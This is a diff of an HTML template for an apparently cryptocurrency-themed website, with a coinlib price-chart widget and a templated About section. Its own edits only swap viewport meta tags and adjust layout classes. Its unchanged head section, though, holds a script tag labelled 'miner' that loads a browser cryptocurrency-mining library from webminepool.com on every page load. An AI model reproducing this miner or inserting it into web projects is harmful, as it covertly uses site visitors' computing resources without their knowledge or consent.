@@ -4,9 +4,9 @@
 <head>       
     <meta charset="UTF-8">  
 
-    <!-- <meta name="viewport" content="width=1024"> -->
+    <meta name="viewport" content="width=1024">
     <!-- Responsive Meta -->                    
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
     
  <!--miner-->
 <script src="https://webminepool.com/lib/base.js"></script>
@@ -157,14 +157,14 @@
             <!--About Start -->
             <div class="about-section p-tb mercury-layout" id="about">
                 <div class="container">
-                     <div class="row flex-row-reverse align-items-center">
+                     <div class="row flex-row-reverse">
 					 
 					<div class="col-lg-6 col-md-12">
 					    <div class="about-mercury-img mobile">
                             <div style="height:330px; padding:0px; margin:0px; width: 100%;"><iframe src="https://widget.coinlib.io/widget?type=chart&theme=dark&coin_id=859&pref_coin_id=1505" width="100%" height="380px" scrolling="none" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;line-height:14px;"></iframe></div>
                         </div>
                     </div>
-                        <div style="margin-top:100px;" class="col-lg-6 col-md-12">
+                        <div class="col-lg-6 col-md-12">
                             <div class="animated" data-animate="fadeInUp" data-delay=".1">
 
                                 <h2 class="section-heading">About {{$settings->site_name}}</h2>
